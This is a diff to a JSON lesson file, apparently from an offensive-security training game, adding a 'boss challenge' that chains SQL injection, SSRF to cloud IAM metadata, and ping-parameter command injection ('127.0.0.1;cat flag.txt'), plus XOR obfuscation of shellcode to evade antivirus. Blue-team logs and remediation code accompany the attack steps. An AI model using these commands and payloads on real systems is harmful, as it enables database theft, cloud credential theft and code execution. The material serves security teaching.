@@ -408,6 +408,24 @@
             "secureCode": "// Patched: Limit execution privileges. Allocate as RW, then transition to RX\nLPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nDWORD oldProtect;\nVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);",
             "explanation": "Allocating memory buffers immediately with full Read-Write-Execute permissions is a primary trigger for EDR heuristic alarms. Separate allocation privileges and monitor system call anomalies."
           }
+        },
+        {
+          "id": "A07",
+          "title": "Boss Challenge: Enterprise Network Breach",
+          "technique": "Exploit Chain: Pivoting & Code Execution",
+          "theory": "Enterprise security compromises are characterized by complex lateral movement. Attackers chain distinct vulns: first, Time-Based Blind SQL Injection to extract database keys; second, SSRF to retrieve cloud IAM credentials; third, OS Command Injection on internal hosts to achieve Remote Code Execution (RCE); and fourth, executing AV bypass techniques to evade Endpoint Detection & Response (EDR) active memory scanning.",
+          "guide": "Chain all Advanced Tier techniques to breach the secure enterprise portal:\n1. Dump the database: `sqlmap -u \"http://vulnerable.com/items?id=1\" --dump`\n2. Query the internal metadata: `curl \"http://vulnerable.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"`\n3. Inject ping command RCE: `curl \"http://vulnerable.com/ping?ip=127.0.0.1;cat flag.txt\"`\n4. Obfuscate signature to bypass defender: `obfuscate --payload shellcode.bin --method xor --key 0x5A`\n5. Submit flag: `submit flag{advanced_boss_defeated}`.",
+          "lab": "Exfiltrate database keys via sqlmap, pivot using SSRF to access internal endpoints, spawn a low-level shell via command injection, and bypass AV scanner heuristics using payload obfuscation to read the final root flag.",
+          "opSec": "Chaining advanced exploits generates multiple host and network-based alerts. Defenders combine EDR, cloud proxy, and firewall telemetry to map the adversary's lateral pivoting path.",
+          "flag": "flag{advanced_boss_defeated}",
+          "cheatSheet": "sqlmap -u \"http://vulnerable.com/item?id=1\" --dump\ncurl \"http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\ncurl \"http://vulnerable.com/ping?ip=127.0.0.1;cat flag.txt\"\nobfuscate --payload shellcode.bin --method xor",
+          "blueTeamLogs": "Jul 27 13:30:05 sql-server: Time-based SQLi anomaly query detected.\nJul 27 13:30:10 proxy-guard: SSRF egress to metadata service blocked.\nJul 27 13:30:15 apache2: OS command executed via ping parameter.\nJul 27 13:30:20 edr-agent: Alert: In-memory shellcode bypass execution.",
+          "remediation": {
+            "vulnerableCode": "/* Vulnerable chained endpoints (SQLi, SSRF, Command Injection) */\nquery = f\"SELECT * FROM items WHERE id = '{item_id}'\"\nrequests.get(url)\nos.system(\"ping -c 1 \" + ip)",
+            "language": "python",
+            "secureCode": "/* Secure implementation */\nquery = \"SELECT * FROM items WHERE id = ?\"\n# Restrict SSRF via DNS/IP checks, use subprocess without shell execution",
+            "explanation": "Pivoting relies on chaining minor security issues. Implement parameterized queries, strict network egress firewalls, and command boundaries to break the compromise path."
+          }
         }
       ]
     }
